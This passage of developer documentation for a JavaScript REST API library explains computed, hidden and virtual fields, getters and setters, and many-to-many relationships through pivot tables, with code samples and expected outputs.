        return [attributes.firstName, attributes.lastName]
          .filter(Boolean)
          .join(' ');
      }
    },
    
    age: {
      type: 'number',
      computed: true,
      dependencies: ['dateOfBirth'],  // Depends on hidden field
      compute: ({ attributes }) => {
        if (!attributes.dateOfBirth) return null;
        const birth = new Date(attributes.dateOfBirth);
        const today = new Date();
        let age = today.getFullYear() - birth.getFullYear();
        const monthDiff = today.getMonth() - birth.getMonth();
        if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < birth.getDate())) {
          age--;
        }
        return age;
      }
    }
  }
});
```

### Async Computed Fields

```javascript
await api.addResource('products', {
  schema: {
    id: { type: 'id' },
    name: { type: 'string' },
    
    inventoryStatus: {
      type: 'string',
      computed: true,
      dependencies: ['id'],
      compute: async ({ attributes, context }) => {
        // Could check external inventory system
        const count = await context.knex('inventory')
          .where('product_id', attributes.id)
          .sum('quantity as total')
          .first();
        
        if (count.total > 100) return 'In Stock';
        if (count.total > 0) return 'Low Stock';
        return 'Out of Stock';
      }
    }
  }
});
```

### Compute Function Context

The compute function receives a rich context:

```javascript
compute: (context) => {
  // context contains:
  // - attributes: all record attributes (including dependencies)
  // - record: full record with id
  // - context: request context with knex, transaction, etc.
  // - helpers: API helpers
  // - api: full API instance
  // - scopeName: current resource name
}
```

### Important Notes on Computed Fields

1. **Output Only**: If a computed field is sent in input, it's ignored with a warning
2. **Always Fresh**: Calculated on every request (no caching)
3. **Dependencies**: The system automatically fetches dependency fields from the database
4. **Sparse Fieldsets**: Work seamlessly with JSON:API sparse fieldsets
5. **Performance**: Keep computations fast as they run on every request

## Hidden Fields

Control which fields are visible in API responses:

### Hidden Fields - Never Visible

```javascript
await api.addResource('users', {
  schema: {
    email: { type: 'string', required: true },
    passwordHash: { type: 'string', hidden: true },
    salt: { type: 'string', hidden: true },
    internalNotes: { type: 'string', hidden: true }
  }
});

// These fields are NEVER returned in responses, even if explicitly requested
```

### Normally Hidden Fields - Available on Request

```javascript
await api.addResource('products', {
  schema: {
    name: { type: 'string', required: true },
    price: { type: 'number', required: true },
    cost: { type: 'number', normallyHidden: true },
    supplierCode: { type: 'string', normallyHidden: true }
  }
});

// Hidden by default
GET /products/1
// Returns: { id: '1', name: 'Widget', price: 99.99 }

// Explicitly request hidden fields
GET /products/1?fields[products]=name,price,cost
// Returns: { id: '1', name: 'Widget', price: 99.99, cost: 45.00 }
```

## Advanced Transformations with Hooks

For complex transformations that depend on context (user permissions, time of day, etc.), use the `enrichAttributes` hook:

```javascript
// Add permission-based field visibility
api.on('enrichAttributes', ({ attributes, context }) => {
  if (context.user?.role !== 'admin') {
    delete attributes.profitMargin;
    delete attributes.cost;
  }
  return attributes;
});

// Add dynamic computed fields
api.on('enrichAttributes', ({ attributes, context }) => {
  if (context.scopeName === 'products') {
    attributes.isOnSale = attributes.price < attributes.regularPrice;
  }
  return attributes;
});
```

For more details on hooks, see the [Hooks Documentation](./GUIDE_3_Hooks.md).

## Complete Example: E-commerce Product

Here's a complete example showing all transformation types working together:

```javascript
await api.addResource('products', {
  schema: {
    // Regular fields
    sku: { type: 'string', required: true },
    name: { type: 'string', required: true },
    description: { type: 'string' },
    
    // Price with setter for cents conversion
    price: { 
      type: 'number', 
      required: true,
      setter: function(value, { attributes }) {
        // Accept price in cents via virtual field
        if (attributes.priceInCents !== undefined) {
          return attributes.priceInCents / 100;
        }
        return value;
      },
      getter: (value) => Number(value.toFixed(2))
    },
    
    // Hidden cost field
    cost: { 
      type: 'number', 
      required: true, 
      normallyHidden: true 
    },
    
    // Never visible
    supplierApiKey: { 
      type: 'string', 
      hidden: true 
    },
    
    // Virtual fields for input
    priceInCents: { type: 'number', virtual: true },
    importFromSupplier: { type: 'boolean', virtual: true },
    
    // Computed fields for output
    profitMargin: {
      type: 'number',
      computed: true,
      dependencies: ['price', 'cost'],
      compute: ({ attributes }) => {
        if (!attributes.price || !attributes.cost) return null;
        return ((attributes.price - attributes.cost) / attributes.price * 100).toFixed(2);
      }
    },
    
    displayPrice: {
      type: 'string',
      computed: true,
      dependencies: ['price'],
      compute: ({ attributes }) => {
        return `$${attributes.price.toFixed(2)}`;
      }
    }
  }
});

// Usage example:
// POST /products
{
  "data": {
    "type": "products",
    "attributes": {
      "sku": "WIDGET-001",
      "name": "Super Widget",
      "description": "The best widget",
      "priceInCents": 9999,        // Virtual field (converted to 99.99)
      "cost": 45.00,
      "importFromSupplier": true,  // Virtual field (triggers hook)
      "supplierApiKey": "secret"   // Hidden field (stored but never returned)
    }
  }
}

// Hook to handle virtual field
api.on('beforeData:create:products', async ({ inputRecord, context }) => {
  if (inputRecord.data.attributes.importFromSupplier) {
    // Use the hidden supplierApiKey to fetch data
    const data = await fetchFromSupplier(inputRecord.data.attributes.supplierApiKey);
    inputRecord.data.attributes.description = data.description;
  }
});

// Response:
{
  "data": {
    "type": "products",
    "id": "1",
    "attributes": {
      "sku": "WIDGET-001",
      "name": "Super Widget",
      "description": "The best widget",
      "price": 99.99,              // Setter converted from cents
      "displayPrice": "$99.99",    // Computed field
      "profitMargin": "54.95",     // Computed field (if user has permission)
      "importFromSupplier": true   // Virtual field preserved
      // Note: cost, supplierApiKey not included
    }
  }
}
```

## Best Practices

### When to Use Each Transformation Type

| Need | Use | Example |
|------|-----|---------|
| Temporary request data | Virtual field | Password confirmation |
| Clean input data | Setter | Lowercase emails, trim whitespace |
| Format output data | Getter | Format phone numbers, parse JSON |
| Calculate from other fields | Computed field | Full names, totals, percentages |
| Security-sensitive data | Hidden field | Password hashes, API keys |
| Sensitive business data | Normally hidden field | Costs, internal notes |
| Context-aware transforms | enrichAttributes hook | Permission-based visibility |

### Performance Considerations

1. **Setters/Getters**: Keep them fast and synchronous when possible
2. **Computed Fields**: 
   - Calculated on every request (no caching)
   - Dependencies are always fetched from DB
   - Consider storing frequently accessed computed values
3. **Virtual Fields**: No performance impact (not stored/retrieved)
4. **Hidden Fields**: Filtered after retrieval (minimal impact)

### Common Pitfalls to Avoid

1. **Don't use computed fields for heavy calculations** - Consider background jobs instead
2. **Don't put validation logic in setters** - Use schema validation or hooks
3. **Remember computed fields are output-only** - They're ignored in input
4. **Test edge cases** - Null values, missing dependencies, etc.
5. **Document virtual fields** - They're part of your API contract

## Migration Tips

If you're migrating from an older version:
- Computed fields now use `computed: true` in the schema (not a separate object)
- Virtual fields use `virtual: true` in the schema
- All field transformations are defined in one place: the schema

## Summary

The JSON REST API library provides a complete transformation pipeline:
- **Virtual fields** for temporary data that flows through but isn't stored
- **Setters** for cleaning and transforming input before storage
- **Getters** for formatting and transforming output after retrieval
- **Computed fields** for deriving values from other fields
- **Hidden fields** for controlling visibility
- **Hooks** for advanced context-aware transformations

By combining these tools, you can build APIs that accept user-friendly input, store data efficiently, and return perfectly formatted responses.

---

# Detailed Guide: Computed Fields

Computed fields are virtual fields that don't exist in your database but are calculated on-the-fly from other fields. They're computed after the database load, every time they're requested, and can depend on other fields (including hidden ones). Computed fields work seamlessly with sparse fieldsets and are calculated for both main resources and included resources.

Let's create a complete example with products and reviews:

```javascript
// Define products resource with computed fields
await api.addResource('products', {
  schema: {
    name: { type: 'string', required: true, max: 255 },
    price: { type: 'number', required: true, min: 0 },
    cost: { type: 'number', required: true, min: 0, normallyHidden: true },
    profit_margin: {
      type: 'number',
      computed: true,  // Mark as computed field
      dependencies: ['price', 'cost'],
      compute: ({ attributes }) => {
        if (!attributes.price || attributes.price === 0) return 0;
        return ((attributes.price - attributes.cost) / attributes.price * 100).toFixed(2);
      }
    },
    // Computed fields can also be async
    availability_status: {
      type: 'string',
      computed: true,  // Mark as computed field
      dependencies: ['name'],
      compute: async ({ attributes }) => {
        // Simulate async operation (e.g., checking external inventory)
        await new Promise(resolve => setTimeout(resolve, 10));
        return `${attributes.name} - In Stock`;
      }
    }
  },
  relationships: {
    reviews: { hasMany: 'reviews', foreignKey: 'product_id' }
  }
});
await api.resources.products.createKnexTable();

// Define reviews resource with computed fields
await api.addResource('reviews', {
  schema: {
    product_id: { type: 'id', belongsTo: 'products', as: 'product', required: true },
    reviewer_name: { type: 'string', required: true },
    rating: { type: 'number', required: true, min: 1, max: 5 },
    comment: { type: 'string', max: 1000 },
    helpful_votes: { type: 'number', default: 0 },
    total_votes: { type: 'number', default: 0 },
    helpfulness_score: {
      type: 'number',
      computed: true,  // Mark as computed field
      dependencies: ['helpful_votes', 'total_votes'],
      compute: ({ attributes }) => {
        if (attributes.total_votes === 0) return null;
        return ((attributes.helpful_votes / attributes.total_votes) * 100).toFixed(0);
      }
    }
  }
});
await api.resources.reviews.createKnexTable();
```

The key features to note:
- `cost` is marked as `normallyHidden` - it won't be returned unless explicitly requested
- `profit_margin` depends on both `price` and `cost`
- `helpfulness_score` is computed for each review

## Basic Usage

Let's create some data and see how computed fields work:

```javascript
// Create a product
const product = await api.resources.products.post({
  name: 'Premium Headphones',
  price: 199.99,
  cost: 89.50
});

// Fetch the product - computed fields are automatically calculated
const fetchedProduct = await api.resources.products.get({ id: product.id });
console.log(fetchedProduct);
// {
//   id: '1',
//   name: 'Premium Headphones',
//   price: 199.99,
//   profit_margin: '55.23',    // Computed: (199.99 - 89.50) / 199.99 * 100
//   availability_status: 'Premium Headphones - In Stock' // Async computed field
// }
// Note: 'cost' is not included (normallyHidden)

// Add some reviews
const review1 = await api.resources.reviews.post({
  product_id: product.id,
  reviewer_name: 'Alice',
  rating: 5,
  comment: 'Excellent sound quality!',
  helpful_votes: 45,
  total_votes: 50
});
console.log(review1);

const review2 = await api.resources.reviews.post({
  product_id: product.id,
  reviewer_name: 'Bob',
  rating: 4,
  comment: 'Good, but a bit pricey',
  helpful_votes: 10,
  total_votes: 25
});
console.log(review2);


```

## Sparse Fieldsets and Dependencies

When you request a computed field via sparse fieldsets, the system automatically fetches its dependencies:

```javascript
// Request only name and profit_margin
const sparseProduct = await api.resources.products.get({
  id: product.id,
  queryParams: {
    fields: { products: 'name,profit_margin' }
  }
});
console.log('Product with sparse fields:', sparseProduct);

const productWithCost = await api.resources.products.get({
  id: product.id,
  queryParams: {
    fields: { products: 'name,cost,profit_margin' }
  }
});
console.log('Product with sparse fields includig cost:', productWithCost);
```

**Expected output**:

```text
Product with sparse fields: {
  id: '1',
  name: 'Premium Headphones',
  profit_margin: '55.25',
  availability_status: 'Premium Headphones - In Stock',
  reviews_ids: [ '1', '2' ]
}
Product with sparse fields includig cost: {
  id: '1',
  name: 'Premium Headphones',
  cost: 89.5,
  profit_margin: '55.25',
  reviews_ids: [ '1', '2' ]
}
```

## Computed Fields in Included Resources

Computed fields work seamlessly with included resources:

```javascript
// Fetch product with reviews
const productWithReviews = await api.resources.products.get({
  id: product.id,
  queryParams: {
    include: ['reviews']
  }
});
console.log('Product With Reviews:', productWithReviews);

// Use sparse fieldsets on included resources
const productWithSparseReviews = await api.resources.products.get({
  id: product.id,
  queryParams: {
    include: ['reviews'],
    fields: {
      products: 'name,price',
      reviews: 'reviewer_name,rating,helpfulness_score'  // Only these fields
    }
  }
});
console.log('Product With Sparse Reviews:', productWithSparseReviews);
```

**Expected Output**:

```text
Product With Reviews: {
  id: '1',
  name: 'Premium Headphones',
  price: 199.99,
  profit_margin: '55.25',
  availability_status: 'Premium Headphones - In Stock',
  reviews_ids: [ '1', '2' ],
  reviews: [
    {
      id: '1',
      reviewer_name: 'Alice',
      rating: 5,
      comment: 'Excellent sound quality!',
      helpful_votes: 45,
      total_votes: 50,
      helpfulness_score: '90'
    },
    {
      id: '2',
      reviewer_name: 'Bob',
      rating: 4,
      comment: 'Good, but a bit pricey',
      helpful_votes: 10,
      total_votes: 25,
      helpfulness_score: '40'
    }
  ]
}
Product With Sparse Reviews: {
  id: '1',
  name: 'Premium Headphones',
  price: 199.99,
  reviews_ids: [ '1', '2' ],
  reviews: [
    {
      id: '1',
      reviewer_name: 'Alice',
      rating: 5,
      helpfulness_score: '90'
    },
    {
      id: '2',
      reviewer_name: 'Bob',
      rating: 4,
      helpfulness_score: '40'
    }
  ]
}
```

## Error Handling

Computed fields handle errors gracefully:

```javascript

// Create a review with no votes
const review3 = await api.resources.reviews.post({
  product_id: product.id,
  reviewer_name: 'Charlie',
  rating: 3,
  comment: 'Average product',
  helpful_votes: 0,
  total_votes: 0  // This will cause division by zero
});

const fetchedReviewWithError = await api.resources.reviews.get({ id: review3.id });
console.log('Fetched review (with error in helpfulness score):', fetchedReviewWithError
```

**Expected Output**:

```text
Fetched review (with error in helpfulness score): {
  id: '3',
  reviewer_name: 'Charlie',
  rating: 3,
  comment: 'Average product',
  helpful_votes: 0,
  total_votes: 0,
  helpfulness_score: null,
  product_id: '1'
}
```

## Key Points

1. **Always Computed** - Computed fields are calculated fresh on every request, there's no caching.

2. **Dependencies Are Fetched** - When you request a computed field, all its dependencies are automatically fetched from the database, even if they won't appear in the response.

3. **Works with Sparse Fieldsets** - You can request computed fields just like regular fields using sparse fieldsets.

4. **Hidden Dependencies** - Fields marked as `normallyHidden` can be used as dependencies and will be fetched for computation, but won't appear in the response unless explicitly requested.

5. **Included Resources** - Computed fields are calculated for all resources, whether they're the main resource or included via relationships.

6. **Error Handling** - If a computation fails, the field is set to `null` and an error is logged, but the request continues.

## Async Computed Fields

Computed fields can be asynchronous - simply return a Promise or use async/await. The compute function will be awaited during field resolution:

```javascript
schema: {
  name: { type: 'string', required: true },
  availability_status: {
    type: 'string',
    computed: true,  // Mark as computed field
    dependencies: ['name'],
    compute: async ({ attributes }) => {
      // Perform async operation
      await new Promise(resolve => setTimeout(resolve, 10));
      return `${attributes.name} - In Stock`;
    }
  }
}
```

## Best Practices

1. **Keep Computations Simple** - Computed fields should be quick calculations. While async is supported, avoid heavy operations like database queries or external API calls.

2. **Declare All Dependencies** - Always list all fields your computation needs in the `dependencies` array.

3. **Handle Edge Cases** - Check for null values and division by zero in your compute functions.

4. **Consider Performance** - Remember that dependencies are always fetched. If you have expensive computations or many dependencies, consider storing the computed value as a regular field instead.

---

# Detailed Guide: Getters and Setters

## Introduction

Field getters and setters allow you to transform data as it moves between your API and database:

- **Getters**: Transform data when reading from the database (e.g., formatting phone numbers, trimming strings)
- **Setters**: Transform data before writing to the database (e.g., normalizing emails, hashing passwords)

This is different from computed fields, which are virtual fields calculated on-the-fly. Getters and setters work with actual database columns.

## Initial Setup: A Blog System

Let's start with a simple blog system without any getters or setters:

```javascript
import { Api } from 'hooked-api';
import RestApiPlugin from 'json-rest-api/plugins/core/rest-api-plugin.js';
import RestApiKnexPlugin from 'json-rest-api/plugins/core/rest-api-knex-plugin.js';
import knex from 'knex';

// Create database connection
const db = knex({
  client: 'better-sqlite3',
  connection: { filename: './blog.db' }
});

// Create API instance
const api = new Api({ name: 'blog-api' });

// Install plugins
await api.use(RestApiPlugin);
await api.use(RestApiKnexPlugin, { knex: db });

// Define authors resource (no getters/setters yet)
await api.addResource('authors', {
  schema: {
    id: { type: 'id' },
    email: { type: 'string', required: true },
    name: { type: 'string', required: true },
    bio: { type: 'string', nullable: true }
  },
  relationships: {
    posts: { hasMany: 'posts', foreignKey: 'author_id' }
  },
  tableName: 'authors'
});

// Define posts resource (no getters/setters yet)
await api.addResource('posts', {
  schema: {
    id: { type: 'id' },
    title: { type: 'string', required: true },
    content: { type: 'string', required: true },
    author_id: { type: 'number', belongsTo: 'authors', as: 'author' },
    published_at: { type: 'dateTime', default: 'now()' }
  },
  tableName: 'posts'
});

// Create tables
await api.resources.authors.createKnexTable();
await api.resources.posts.createKnexTable();

// Create test data
const author = await api.resources.authors.post({
  email: '  Jane.Doe@BLOG.COM  ',
  name: '  Jane Doe  ',
  bio: '  Software developer and writer  '
});

const post1 = await api.resources.posts.post({
  title: '  Getting Started with APIs  ',
  content: '  This is my first post about APIs...  ',
  author_id: author.id
});

const post2 = await api.resources.posts.post({
  title: '  advanced api patterns  ',
  content: '  Let\'s explore some advanced patterns...  ',
  author_id: author.id
});

// Fetch author with posts
const authorWithPosts = await api.resources.authors.get({
  id: author.id,
  queryParams: { include: ['posts'] }
});

console.log('Author with posts (no getters):', authorWithPosts);
// Notice the messy data:
// - Email has spaces and mixed case
// - Name and bio have extra spaces
// - Post titles are inconsistently cased
// - Content has leading/trailing spaces
```

## Adding Getters: Transform Data on Read

Now let's add getters to clean up the data automatically:

```javascript
// Enhanced authors resource with getters
await api.addResource('authors', {
  schema: {
    id: { type: 'id' },
    email: { 
      type: 'string',
      required: true,
      getter: (value) => value?.toLowerCase().trim()
    },
    name: { 
      type: 'string',
      required: true,
      getter: (value) => value?.trim()
    },
    bio: { 
      type: 'string',
      nullable: true,
      getter: (value) => value?.trim()
    }
  },
  relationships: {
    posts: { hasMany: 'posts', foreignKey: 'author_id' }
  },
  tableName: 'authors'
});

// Enhanced posts resource with getters
await api.addResource('posts', {
  schema: {
    id: { type: 'id' },
    title: { 
      type: 'string',
      required: true,
      getter: (value) => {
        // Capitalize first letter of each word
        return value?.trim()
          .split(' ')
          .map(word => word.charAt(0).toUpperCase() + word.slice(1).toLowerCase())
          .join(' ');
      }
    },
    content: { 
      type: 'string',
      required: true,
      getter: (value) => value?.trim()
    },
    author_id: { type: 'number', belongsTo: 'authors', as: 'author' },
    published_at: { type: 'dateTime', default: 'now()' }
  },
  tableName: 'posts'
});

// Now fetch the same author with posts
const cleanAuthorWithPosts = await api.resources.authors.get({
  id: author.id,
  queryParams: { include: ['posts'] }
});

console.log('Author:', cleanAuthorWithPosts);
// {
//   id: '1',
//   email: 'jane.doe@blog.com',      // Normalized
//   name: 'Jane Doe',                 // Trimmed
//   bio: 'Software developer and writer', // Trimmed
//   posts: [
//     {
//       id: '1',
//       title: 'Getting Started With Apis',  // Title case
//       content: 'This is my first post about APIs...', // Trimmed
//       author_id: 1,
//       published_at: '2024-01-15T10:30:00.000Z'
//     },
//     {
//       id: '2', 
//       title: 'Advanced Api Patterns',      // Title case
//       content: 'Let\'s explore some advanced patterns...', // Trimmed
//       author_id: 1,
//       published_at: '2024-01-15T10:31:00.000Z'
//     }
//   ]
// }

// Getters also work in queries
const allPosts = await api.resources.posts.query({
  queryParams: { 
    include: ['author'],
    filters: { author_id: author.id }
  }
});

console.log('All posts with author:', allPosts);
// Both posts and included authors have getters applied
```

## Adding Setters: Transform Data on Write

Setters ensure data is normalized before it's stored:

```javascript
// Add setters to authors
await api.addResource('authors', {
  schema: {
    id: { type: 'id' },
    email: { 
      type: 'string',
      required: true,
      setter: (value) => value?.toLowerCase().trim(),
      getter: (value) => value
    },
    name: { 
      type: 'string',
      required: true,
      setter: (value) => value?.trim(),
      getter: (value) => value
    },
    bio: { 
      type: 'string',
      nullable: true,
      setter: (value) => value?.trim(),
      getter: (value) => value
    }
  },
  relationships: {
    posts: { hasMany: 'posts', foreignKey: 'author_id' }
  },
  tableName: 'authors'
});

// Now when we create an author, data is cleaned before storage
const newAuthor = await api.resources.authors.post({
  email: '  JOHN.SMITH@BLOG.COM  ',
  name: '  John Smith  ',
  bio: '  Tech enthusiast  '
});

console.log('New author:', newAuthor);
// Data is already clean:
// {
//   id: '2',
//   email: 'john.smith@blog.com',
//   name: 'John Smith',
//   bio: 'Tech enthusiast'
// }
```

## Async Setters for Secure Data

Use async setters for operations like password hashing:

```javascript
await api.addResource('users', {
  schema: {
    id: { type: 'id' },
    email: { 
      type: 'string',
      required: true,
      setter: (value) => value?.toLowerCase().trim()
    },
    password: { 
      type: 'string',
      required: true,
      min: 8,
      setter: async (value) => {
        // Simulate password hashing
        await new Promise(resolve => setTimeout(resolve, 10));
        return `hashed:${value}`;
      },
      getter: () => '[PROTECTED]' // Never expose hashed passwords
    }
  },
  tableName: 'users'
});

const user = await api.resources.users.post({
  email: '  USER@EXAMPLE.COM  ',
  password: 'mySecretPassword123'
});

console.log('Created user:', user);
// {
//   id: '1',
//   email: 'user@example.com',
//   password: '[PROTECTED]'
// }
```

## Setter Dependencies

When setters depend on other fields, use `runSetterAfter`:

```javascript
await api.addResource('products', {
  schema: {
    id: { type: 'id' },
    name: { type: 'string', required: true },
    base_price: { 
      type: 'number',
      setter: (value) => Math.round(value * 100) // Convert to cents
    },
    tax_rate: { 
      type: 'number',
      setter: (value) => value || 0
    },
    total_price: {
      type: 'number',
      setter: (value, { attributes }) => {
        // Calculate from base_price (already in cents) and tax_rate
        const total = attributes.base_price * (1 + attributes.tax_rate);
        return Math.round(total);
      },
      runSetterAfter: ['base_price', 'tax_rate']
    }
  },
  tableName: 'products'
});
```

## Summary

Getters and setters provide automatic data transformation:

- **Getters** transform data when reading (including in relationships and queries)
- **Setters** transform data before storing
- Both support async operations and dependencies
- They work with actual database columns

Common uses:
- Email normalization
- String trimming
- Title case formatting
- Password hashing
- Price calculations
- Data consistency across related records# 2.6 Many to many (hasMany with through records)

Many-to-many relationships connect two resources through a pivot/junction table. For example, books can have multiple authors, and authors can write multiple books. This relationship is managed through a `book_authors` table that stores the connections.

Note that `book_authors` is not just a table, but a first class resource that you can manipulate like any other. 

Let's create a complete example with books, authors, and their many-to-many relationship:

```javascript
// Define books resource
await api.addResource('books', {
  schema: {
    title: { type: 'string', required: true, max: 255, search: true, indexed: true },
    isbn: { type: 'string', max: 20, unique: true },
    published_year: { type: 'number', min: 1900, max: 2100 }
  },
  relationships: {
    authors: { 
      hasMany: 'authors',
      through: 'book_authors',  // The pivot table
      foreignKey: 'book_id',    // Column in pivot table pointing to books
      otherKey: 'author_id'     // Column in pivot table pointing to authors
    }
  },
  searchSchema: {
    title: { type: 'string', filterOperator: 'like' },
    
    // Cross-table search through many-to-many relationship
    authorName: { 
      type: 'string', 
      actualField: 'authors.name',  // Search author names through the pivot
      filterOperator: 'like' 
    }
  }
});
await api.resources.books.createKnexTable();

// Define authors resource (already defined above, but showing the many-to-many side)
await api.addResource('authors', {
  schema: {
    name: { type: 'string', required: true, max: 100, search: true, indexed: true },
    surname: { type: 'string', required: true, max: 100, search: true },
    bio: { type: 'string', max: 1000, nullable: true }
  },
  relationships: {
    books: { 
      hasMany: 'books',
      through: 'book_authors',  // Same pivot table
      foreignKey: 'author_id',  // Column in pivot table pointing to authors
      otherKey: 'book_id'      // Column in pivot table pointing to books
    }
  },
  searchSchema: {
    name: { type: 'string', filterOperator: 'like' },
    surname: { type: 'string', filterOperator: 'like' },
    
    // Cross-table search through many-to-many relationship
    bookTitle: { 
      type: 'string', 
      actualField: 'books.title',  // Search book titles through the pivot
      filterOperator: 'like' 
    }
  }
});
await api.resources.authors.createKnexTable();

// Define the pivot table resource
// This is optional but useful if you need to store additional data on the relationship
await api.addResource('book_authors', {
  schema: {
    book_id: { type: 'id', belongsTo: 'books', as: 'book', required: true },
    author_id: { type: 'id', belongsTo: 'authors', as: 'author', required: true },
    contribution_type: { type: 'string', max: 50, nullable: true }, // e.g., 'primary', 'co-author', 'editor'
    royalty_percentage: { type: 'number', min: 0, max: 100, nullable: true }
  }
  // Note: Composite primary keys are not yet supported, but will be added in a future version
  // For now, the table will use the default 'id' primary key
});
await api.resources.book_authors.createKnexTable();
```

The key difference from regular hasMany relationships is the `through` property, which specifies the pivot table. Both `foreignKey` and `otherKey` are mandatory for many-to-many relationships.

Now let's create some data and explore how to work with many-to-many relationships:

```javascript
// Create some authors
const author1 = await api.resources.authors.post({ 
  name: 'Neil', 
  surname: 'Gaiman', 
  bio: 'British author of fiction, horror, and fantasy'
});

const author2 = await api.resources.authors.post({ 
  name: 'Terry', 
  surname: 'Pratchett', 
  bio: 'English humorist and fantasy author'
});

const author3 = await api.resources.authors.post({ 
  name: 'Stephen', 
  surname: 'King', 
  bio: 'American author of horror and supernatural fiction'
});

// Create books with authors - simplified mode
const goodOmens = await api.resources.books.post({
  title: 'Good Omens',
  isbn: '978-0060853983',
  published_year: 1990,
  authors: [author1.id, author2.id]  // Co-authored by Gaiman and Pratchett
});

const americanGods = await api.resources.books.post({
  title: 'American Gods',
  isbn: '978-0380789030',
  published_year: 2001,
  authors: [author1.id]  // Written by Gaiman alone
});

// Create a book using non-simplified mode
const theShining = await api.resources.books.post({
  inputRecord: {
    data: {
      type: 'books',
      attributes: {
        title: 'The Shining',
        isbn: '978-0307743657',
        published_year: 1977
      },
      relationships: {
        authors: {
          data: [
            { type: 'authors', id: author3.id }
          ]
        }
      }
    }
  },
  simplified: false
});
```

## Working with Pivot Tables Directly

Sometimes you need more control over the pivot table data, such as storing additional information about the relationship itself. There are two approaches:

### 1. Creating relationships via the pivot table

Instead of using the `authors` field when creating a book, you can create the relationships directly through the pivot table. This is useful when you need to add extra data:

```javascript
// Create a book without authors
const newBook = await api.resources.books.post({
  title: 'The Color of Magic',
  isbn: '978-0062225672',
  published_year: 1983
});

// Then create the relationship with extra pivot data
await api.resources.book_authors.post({
  book_id: newBook.id,
  author_id: author2.id,  // Terry Pratchett
  contribution_type: 'primary',
  royalty_percentage: 100
});
```

### 2. Updating existing pivot records

If you've already created relationships (e.g., using `authors: [author1.id, author2.id]` during book creation), you can update the pivot records to add extra data:

```javascript
// First, find the pivot records for Good Omens
const pivotRecords = await api.resources.book_authors.query({
  queryParams: {
    filters: {
      book_id: goodOmens.id
    }
  }
});

// Update each pivot record with extra data
for (const record of pivotRecords.data) {
  await api.resources.book_authors.patch({
    id: record.id,
    contribution_type: 'co-author',
    royalty_percentage: 50
  });
}
```

**Note:** Be careful not to create duplicate pivot records. If you use `authors: [...]` when creating a book, the pivot records are created automatically. Only manually create pivot records if you haven't used the relationship field during resource creation.

## Including Many-to-Many Records (`include`)

When you fetch resources with many-to-many relationships, by default you only get the IDs:

```javascript
const book_simplified = await api.resources.books.get({ id: goodOmens.id });
const book_non_simplified = await api.resources.books.get({ id: goodOmens.id, simplified: false });

console.log('Book without includes (simplified):', inspect(book_simplified));
console.log('Book without includes (non-simplified):', inspect(book_non_simplified));
```

**Expected Output**

```text
Book without includes (simplified):
{
  id: '1',
  title: 'Good Omens',
  isbn: '978-0060853983',
  published_year: 1990,
  authors_ids: ['1', '2']  // Just the IDs
}

Book without includes (non-simplified):
{
  data: {
    type: 'books',
    id: '1',
    attributes: {
      title: 'Good Omens',
      isbn: '978-0060853983',
      published_year: 1990
    },
    relationships: {
      authors: {
        data: [
          { type: 'authors', id: '1' },
          { type: 'authors', id: '2' }
        ]
      }
    },
    links: { self: '/api/books/1' }
  },
  links: { self: '/api/books/1' }
}
```

## Including Many to many Records (`include`)

To retrieve the full related resources through a many-to-many relationship, use the `include` query parameter:

```javascript
// Get a book with its authors included
const book_with_authors_simplified = await api.resources.books.get({ 
  id: goodOmens.id, 
  queryParams: { include: ['authors'] } 
});

const book_with_authors_non_simplified = await api.resources.books.get({ 
  id: goodOmens.id, 
  queryParams: { include: ['authors'] }, 
  simplified: false 
});

// Get all books with their authors
const books_with_authors_simplified = await api.resources.books.query({ 
  queryParams: { include: ['authors'] } 
});

const books_with_authors_non_simplified = await api.resources.books.query({ 
  queryParams: { include: ['authors'] }, 
  simplified: false 
});

console.log('Book with authors (simplified):', inspect(book_with_authors_simplified));
console.log('Book with authors (non-simplified):', inspect(book_with_authors_non_simplified));
console.log('Books with authors (simplified):', inspect(books_with_authors_simplified));
console.log('Books with authors (non-simplified):', inspect(books_with_authors_non_simplified));
```

**Expected Output**

```text
Book with authors (simplified): {
  id: '1',
  title: 'Good Omens',
  isbn: '978-0060853983',
  published_year: 1990,
  authors_ids: [ '1', '2' ],
  authors: [
    {
      id: '1',
      name: 'Neil',
      surname: 'Gaiman',
      bio: 'British author of fiction, horror, and fantasy',
      books_ids: []
    },
    {
      id: '2',
      name: 'Terry',
      surname: 'Pratchett',
      bio: 'English humorist and fantasy author',
      books_ids: []
    }
  ]
}
Book with authors (non-simplified): {
  data: {
    type: 'books',
    id: '1',
    attributes: {
      title: 'Good Omens',
      isbn: '978-0060853983',
      published_year: 1990
    },
    relationships: {
      authors: {
        data: [ { type: 'authors', id: '1' }, { type: 'authors', id: '2' } ],
        links: {
          self: '/api/books/1/relationships/authors',
          related: '/api/books/1/authors'
        }
      }
    },
    links: { self: '/api/books/1' }
  },
  included: [
    {
      type: 'authors',
      id: '1',
      attributes: {
        name: 'Neil',
        surname: 'Gaiman',
        bio: 'British author of fiction, horror, and fantasy'
      },
      relationships: { books: { data: [] } },
      links: { self: '/api/authors/1' }
    },
    {
      type: 'authors',
      id: '2',
      attributes: {
        name: 'Terry',
        surname: 'Pratchett',
        bio: 'English humorist and fantasy author'
      },
      relationships: { books: { data: [] } },
      links: { self: '/api/authors/2' }
    }
  ],
  links: { self: '/api/books/1' }
}
Books with authors (simplified): {
  data: [
    {
      id: '1',
      title: 'Good Omens',
      isbn: '978-0060853983',
      published_year: 1990,
      authors_ids: [ '1', '2' ],
      authors: [
        {
          id: '1',
          name: 'Neil',
          surname: 'Gaiman',
          bio: 'British author of fiction, horror, and fantasy',
          books_ids: []
        },
        {
          id: '2',
          name: 'Terry',
          surname: 'Pratchett',
          bio: 'English humorist and fantasy author',
          books_ids: []
        }
      ]
    },
    {
      id: '2',
      title: 'American Gods',
      isbn: '978-0380789030',
      published_year: 2001,
      authors_ids: [ '1' ],
      authors: [
        {
          id: '1',
          name: 'Neil',
          surname: 'Gaiman',
          bio: 'British author of fiction, horror, and fantasy',
          books_ids: []
        }
      ]
    },
    {
      id: '3',
      title: 'The Shining',
      isbn: '978-0307743657',
      published_year: 1977,
      authors_ids: [ '3' ],
      authors: [
        {
          id: '3',
          name: 'Stephen',
          surname: 'King',
          bio: 'American author of horror and supernatural fiction',
          books_ids: []
        }
      ]
    }
  ],
  links: { self: '/api/books?include=authors' }
}
Books with authors (non-simplified): {
  data: [
    {
      type: 'books',
      id: '1',
      attributes: {
        title: 'Good Omens',
        isbn: '978-0060853983',
        published_year: 1990
      },
      relationships: {
        authors: {
          data: [
            { type: 'authors', id: '1' },
            { type: 'authors', id: '2' }
          ],
          links: {
